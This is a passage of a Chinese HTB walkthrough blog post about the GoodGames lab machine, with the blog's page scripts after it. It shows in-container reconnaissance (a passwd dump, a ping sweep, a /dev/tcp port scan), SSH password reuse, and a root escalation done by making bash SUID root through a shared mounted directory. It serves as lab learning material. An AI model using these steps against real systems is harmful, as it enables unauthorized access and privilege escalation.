class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/bin/false</span><br></pre></td></tr></table></figure>
+
+<p>而且目标的IP，可能并不是我所想的一个IP一台机那么简单：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@3a453ab39d3d:/backend/project<span class="comment"># ifconfig</span></span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.19.0.2  netmask 255.255.0.0  broadcast 172.19.255.255</span><br><span class="line">        ether 02:42:ac:13:00:02  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 3610  bytes 568033 (554.7 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 2975  bytes 4128083 (3.9 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
+
+<p>我尝试扫描C段：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@3a453ab39d3d:/backend/project<span class="comment"># for i in &#123;1..254&#125;; do (ping -c 1 172.19.0.$&#123;i&#125; | grep &quot;bytes from&quot; | grep -v &quot;Unreachable&quot; &amp;); done;</span></span><br><span class="line">64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.064 ms</span><br><span class="line">64 bytes from 172.19.0.2: icmp_seq=1 ttl=64 time=0.027 ms</span><br></pre></td></tr></table></figure>
+
+<p>可能会是目标C段的网关也说不准，反正它不是我在HTB的网关，是目标独有的，而我当前主机存在的用户目录augustus或许是作者故意挂载过来留给我的提示，或许我可以尝试对其进行探测：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@3a453ab39d3d:~<span class="comment"># for port in &#123;1..65535&#125;; do echo &gt; /dev/tcp/172.19.0.1/$port &amp;&amp; echo &quot;$port open&quot;; done 2&gt;/dev/null</span></span><br><span class="line">22 open</span><br><span class="line">80 open</span><br></pre></td></tr></table></figure>
+
+<p>它开着22，也开着80，尝试一下密码复用吧，毕竟我现在只有那一个密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@3a453ab39d3d:~<span class="comment"># ssh augustus@172.19.0.1</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;172.19.0.1 (172.19.0.1)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>172.19.0.1<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">augustus@172.19.0.1&#x27;</span>s password: </span><br><span class="line">Linux GoodGames 4.19.0-18-amd64 <span class="comment">#1 SMP Debian 4.19.208-1 (2021-09-29) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law. </span><br><span class="line">augustus@GoodGames:~$ <span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line">augustus@GoodGames:~$ </span><br></pre></td></tr></table></figure>
+
+<h4 id="root-txt："><a href="#root-txt：" class="headerlink" title="root.txt："></a>root.txt：</h4><p>看起来我猜的没错，但是竟然没有sudo：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">augustus@GoodGames:~$ sudo -l</span><br><span class="line">bash: sudo: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure>
+
+<p>容器与当前目录是一样的，并且他们是互通的：</p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514172943695.png" srcset="/img/loading.gif" lazyload alt="image-20220514172943695"></p>
+<p>我可以尝试CP一个root权限的bash到当前目录下:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">augustus@GoodGames:~$ <span class="built_in">cp</span> /bin/bash .</span><br></pre></td></tr></table></figure>
+
+<p>然后借助容器中的root用户为其做SUID:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@3a453ab39d3d:/home/augustus<span class="comment"># chown root:root bash</span></span><br><span class="line">root@3a453ab39d3d:/home/augustus<span class="comment"># chmod 4777 bash</span></span><br><span class="line">root@3a453ab39d3d:/home/augustus<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">augustus@GoodGames:~$ <span class="built_in">ls</span> -all</span><br><span class="line">total 1236</span><br><span class="line">drwxr-xr-x 3 augustus augustus    4096 May 14 10:52 .</span><br><span class="line">drwxr-xr-x 3 root     root        4096 Oct 19  2021 ..</span><br><span class="line">-rwsrwxrwx 1 root     root     1234376 May 14 10:52 bash</span><br><span class="line">lrwxrwxrwx 1 root     root           9 Nov  3  2021 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 augustus augustus     220 Oct 19  2021 .bash_logout</span><br><span class="line">-rw-r--r-- 1 augustus augustus    3526 Oct 19  2021 .bashrc</span><br><span class="line">-rw-r--r-- 1 augustus augustus     807 Oct 19  2021 .profile</span><br><span class="line">drwxr-xr-x 2 augustus augustus    4096 May 14 10:29 <span class="built_in">test</span></span><br><span class="line">-rw-r----- 1 root     augustus      33 May 14 07:02 user.txt</span><br></pre></td></tr></table></figure>
+
+<p>然后启动当前目录下的bash：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">augustus@GoodGames:~$ ./bash -p</span><br><span class="line">bash-5.1<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">bash-5.1<span class="comment"># cat /root/root.txt </span></span><br><span class="line">76b01..........................</span><br></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Hack-The-Box/" class="category-chain-item">Hack The Box</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/" class="print-no-link">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HTB Walkthrough - GoodGames</div>
+      <div>https://crazyinside.github.io/post/HackTheBox-GoodGames.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>World'sEnd</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>August 14, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-Hancliffe.html" title="HTB Walkthrough - Hancliffe">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTB Walkthrough - Hancliffe</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-Gobox.html" title="HTB Walkthrough - Gobox">
+                        <span class="hidden-mobile">HTB Walkthrough - Gobox</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
